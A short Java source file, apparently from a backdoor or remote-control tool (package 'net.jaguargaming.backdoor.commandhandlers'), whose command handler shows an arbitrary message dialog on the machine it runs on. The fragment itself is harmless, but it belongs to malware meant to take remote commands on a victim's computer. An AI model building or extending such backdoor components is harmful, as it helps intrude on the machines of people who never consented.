package net.jaguargaming.backdoor.commandhandlers;

import javax.swing.JOptionPane;

public class CMDdialog {
	
	public static void handle(String[] args) throws IllegalArgumentException, NumberFormatException {
		if (args.length != 3) {
			throw new IllegalArgumentException("Not enough details specified");
		}
		try {
			JOptionPane.showMessageDialog(null, args[0], args[1], Integer.parseInt(args[2]));
		} catch (NumberFormatException e) {
			throw e;
		}
	}
	
}
